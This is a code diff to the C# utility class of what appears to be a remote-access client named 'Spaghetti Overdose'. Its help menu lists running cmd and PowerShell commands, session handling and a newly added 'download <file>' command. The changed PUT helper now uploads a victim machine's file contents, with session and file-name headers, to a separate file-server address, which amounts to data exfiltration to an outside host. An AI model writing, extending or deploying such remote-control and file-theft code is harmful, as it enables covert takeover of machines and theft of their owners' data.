@@ -11,11 +11,12 @@ class Utilities
     {
         return "!#!\n  Spaghetti Overdose\n" +
             " ----------------------------------------------------------\n" +
-            "   <command>               Run cmd command [Default]" +
+            "   <command>               Run cmd command [Default]\n" +
+            "   download <file>         download file\n" +
+            "   exit               Close the client connection\n" +
             "   help                    Print this message\n" +
             "   powershell <command>    Run powershell command\n" +
-            "   session                 Get session ID\n" +
-            "   terminate               Close the client connection\n";
+            "   session                 Get session ID\n";
 
     }
 
@@ -114,7 +115,7 @@ class Utilities
     }
 
     // HTTP Put Request
-    public static void Put(string uri, string filename, string location, string sessionid, string method = "PUT")
+    public static void Put(string fs_uri, string uri, string filename, string location, string sessionid, string method = "PUT")
     {
         string output = "";
         byte[] content = FileToByte(location, filename);
@@ -127,7 +128,12 @@ class Utilities
             using (var client = new WebClient())
             {
                 client.Headers.Add("Session-Id", sessionid);
-                client.UploadData(uri, method, content);
+
+                string[] splitted = filename.Split(Path.DirectorySeparatorChar);
+                filename = splitted[splitted.Length - 1];
+
+                client.Headers.Add("File-Name", filename);
+                client.UploadData(fs_uri, method, content);
                 output = "-- Success --";
             }
         }
